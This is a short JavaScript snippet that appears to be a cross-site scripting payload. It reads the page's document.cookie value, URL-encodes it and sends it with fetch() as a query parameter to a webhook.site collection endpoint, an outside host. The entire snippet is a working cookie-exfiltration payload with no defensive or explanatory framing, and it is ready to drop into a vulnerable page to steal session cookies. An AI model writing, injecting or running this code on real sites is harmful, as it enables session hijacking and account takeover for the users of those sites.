// Send a GET request with the domain's cookies as URL parameters
const cookieValue = encodeURIComponent(document.cookie);
const url = `https://webhook.site/53a7f2a0-98d5-4866-b261-115bc6d29972?cookies=${cookieValue}`;

fetch(url, {
  method: 'GET',
  credentials: 'include',  // This still ensures cookies are sent in headers
})
.then(response => response.json())
.then(data => console.log('Success:', data))
.catch((error) => console.error('Error:', error));